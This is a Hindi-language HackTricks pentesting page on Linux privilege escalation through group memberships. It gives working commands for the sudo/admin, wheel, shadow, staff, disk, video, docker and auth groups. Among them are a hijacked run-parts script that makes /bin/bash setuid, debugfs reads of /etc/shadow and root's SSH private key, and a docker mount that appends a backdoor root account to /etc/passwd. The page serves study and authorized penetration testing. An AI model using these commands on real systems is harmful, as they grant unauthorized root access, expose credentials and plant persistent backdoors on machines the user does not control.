# दिलचस्प समूह - लिनक्स प्रिवेस्क

{{#include ../../../banners/hacktricks-training.md}}

## सुदो/एडमिन समूह

### **पीई - विधि 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से (या क्योंकि कुछ सॉफ़्टवेयर को इसकी आवश्यकता होती है)** **/etc/sudoers** फ़ाइल के अंदर आप इनमें से कुछ पंक्तियाँ पा सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **कोई भी उपयोगकर्ता जो sudo या admin समूह का सदस्य है, वह sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निष्पादित कर सकते हैं**:
```
sudo su
```
### PE - Method 2

सभी suid बाइनरी खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आप पाते हैं कि बाइनरी **pkexec एक SUID बाइनरी है** और आप **sudo** या **admin** समूह में हैं, तो आप संभवतः `pkexec` का उपयोग करके बाइनरी को sudo के रूप में निष्पादित कर सकते हैं।\
यह इसलिए है क्योंकि आमतौर पर ये **polkit नीति** के अंदर समूह होते हैं। यह नीति मूल रूप से पहचानती है कि कौन से समूह `pkexec` का उपयोग कर सकते हैं। इसे जांचें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहाँ आप पाएंगे कि कौन से समूह **pkexec** निष्पादित करने की अनुमति रखते हैं और **डिफ़ॉल्ट रूप से** कुछ लिनक्स वितरणों में समूह **sudo** और **admin** प्रकट होते हैं।

**रूट बनने के लिए आप निष्पादित कर सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को निष्पादित करने की कोशिश करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं, बल्कि इसलिए है कि आप GUI के बिना जुड़े नहीं हैं**। और इस समस्या का एक समाधान यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग ssh सत्र** की आवश्यकता है:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**कभी-कभी**, **डिफ़ॉल्ट रूप से** **/etc/sudoers** फ़ाइल के अंदर आप यह पंक्ति पा सकते हैं:
```
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **कोई भी उपयोगकर्ता जो व्हील समूह का सदस्य है, वह sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निष्पादित कर सकते हैं**:
```
sudo su
```
## Shadow Group

**शेडो** समूह के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़** सकते हैं:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
सो, फ़ाइल को पढ़ें और कुछ **हैश क्रैक** करने की कोशिश करें।

## स्टाफ समूह

**staff**: उपयोगकर्ताओं को सिस्टम में स्थानीय संशोधन जोड़ने की अनुमति देता है (`/usr/local`) बिना रूट विशेषाधिकार की आवश्यकता के (ध्यान दें कि `/usr/local/bin` में निष्पादन योग्य फ़ाइलें किसी भी उपयोगकर्ता के PATH वेरिएबल में हैं, और वे समान नाम वाली `/bin` और `/usr/bin` में निष्पादन योग्य फ़ाइलों को "ओवरराइड" कर सकती हैं)। "adm" समूह की तुलना करें, जो निगरानी/सुरक्षा से अधिक संबंधित है। [\[source\]](https://wiki.debian.org/SystemGroups)

डेबियन वितरणों में, `$PATH` वेरिएबल दिखाता है कि `/usr/local/` उच्चतम प्राथमिकता के रूप में चलाया जाएगा, चाहे आप विशेषाधिकार प्राप्त उपयोगकर्ता हों या नहीं।
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
यदि हम `/usr/local` में कुछ प्रोग्रामों को हाईजैक कर सकते हैं, तो हम आसानी से रूट प्राप्त कर सकते हैं।

`run-parts` प्रोग्राम को हाईजैक करना रूट प्राप्त करने का एक आसान तरीका है, क्योंकि अधिकांश प्रोग्राम `run-parts` को चलाएंगे जैसे (क्रॉनटैब, जब ssh लॉगिन)।
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
या जब एक नया ssh सत्र लॉगिन होता है।
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**शोषण**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

यह विशेषाधिकार लगभग **रूट एक्सेस के समान** है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुँच सकते हैं।

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फाइलें लिख** भी सकते हैं। उदाहरण के लिए, `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालांकि, यदि आप **रूट द्वारा स्वामित्व वाले फ़ाइलें लिखने** की कोशिश करते हैं (जैसे `/etc/shadow` या `/etc/passwd`), तो आपको "**अनुमति अस्वीकृत**" त्रुटि मिलेगी।

## वीडियो समूह

कमांड `w` का उपयोग करके आप **जान सकते हैं कि सिस्टम पर कौन लॉग इन है** और यह निम्नलिखित आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** का मतलब है कि उपयोगकर्ता **yossi शारीरिक रूप से** मशीन पर एक टर्मिनल में लॉग इन है।

**video group** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन को देख सकते हैं। ऐसा करने के लिए, आपको **स्क्रीन पर वर्तमान छवि को** कच्चे डेटा में प्राप्त करना होगा और यह जानना होगा कि स्क्रीन किस रिज़ॉल्यूशन का उपयोग कर रही है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन का रिज़ॉल्यूशन `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**कच्ची छवि** को **खोलने** के लिए आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **Raw image data** चुनें:

![](<../../../images/image (463).png>)

फिर चौड़ाई और ऊँचाई को स्क्रीन पर उपयोग की गई मापों में संशोधित करें और विभिन्न छवि प्रकारों की जांच करें (और उस प्रकार का चयन करें जो स्क्रीन को बेहतर दिखाता है):

![](<../../../images/image (317).png>)

## रूट समूह

ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलों या कुछ **लाइब्रेरी** फ़ाइलों या **अन्य दिलचस्प चीजों** को **संशोधित** करने तक पहुँच प्राप्त कर सकते हैं, जिन्हें विशेषाधिकार बढ़ाने के लिए उपयोग किया जा सकता है...

**जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

आप **होस्ट मशीन के रूट फ़ाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं**, इसलिए जब इंस्टेंस शुरू होता है, तो यह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह प्रभावी रूप से आपको मशीन पर रूट देता है।
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
अंत में, यदि आपको पहले के किसी भी सुझाव पसंद नहीं हैं, या वे किसी कारण से काम नहीं कर रहे हैं (docker api firewall?) तो आप हमेशा **एक विशेषाधिकार प्राप्त कंटेनर चलाने और उससे भागने** की कोशिश कर सकते हैं जैसा कि यहां समझाया गया है:

{{#ref}}
../docker-security/
{{#endref}}

यदि आपके पास docker socket पर लिखने की अनुमति है तो [**इस पोस्ट को पढ़ें कि कैसे docker socket का दुरुपयोग करके विशेषाधिकार बढ़ाएं**](../#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd समूह

{{#ref}}
./
{{#endref}}

## Adm समूह

आमतौर पर **`adm`** समूह के **सदस्यों** के पास _/var/log/_ में स्थित **लॉग** फ़ाइलों को **पढ़ने** की अनुमति होती है।\
इसलिए, यदि आपने इस समूह के भीतर एक उपयोगकर्ता को समझौता किया है, तो आपको निश्चित रूप से **लॉग्स पर नज़र डालनी चाहिए**।

## Auth समूह

OpenBSD के अंदर **auth** समूह आमतौर पर _**/etc/skey**_ और _**/var/db/yubikey**_ फ़ोल्डरों में लिख सकता है यदि उनका उपयोग किया जाता है।\
इन अनुमतियों का दुरुपयोग निम्नलिखित एक्सप्लॉइट के साथ **विशेषाधिकार बढ़ाने** के लिए किया जा सकता है: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
